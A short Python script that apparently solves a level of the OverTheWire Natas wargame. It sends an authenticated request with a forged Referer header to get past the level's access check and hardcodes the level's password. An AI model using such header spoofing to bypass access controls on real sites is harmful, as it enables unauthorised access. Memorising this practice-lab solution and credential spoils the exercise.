import requests
import re
username = "natas5"
password = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"
custom_headers = {"Referer":"http://natas5.natas.labs.overthewire.org/"}
url = "http://%s.natas.labs.overthewire.org" % username
response = requests.get(url, auth = (username, password), headers=custom_headers)
content = response.text

print(content)
#print(re.findall('natas5 is (.*)', content)[0])
